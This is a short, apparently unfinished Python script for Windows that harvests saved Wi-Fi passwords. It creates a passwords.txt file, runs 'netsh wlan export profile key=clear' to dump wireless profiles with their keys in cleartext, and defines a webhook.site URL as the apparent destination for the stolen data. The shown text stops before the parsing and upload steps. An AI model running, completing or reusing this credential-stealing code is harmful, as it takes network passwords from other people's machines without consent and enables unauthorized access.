import subprocess
import os
import sys
import requests

url = 'https://webhook.site/7a5e65a7-ebef-47b5-a6c7-3a172100fe3b'

#create a file
password_file = open('passwords.txt', "w")
password_file.write("hello sir! here are your passwords:\n\n")
password_file.close()


#lists

wifi_files = []
wifi_name = []
wifi_password = []




command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

path = os.getcwd()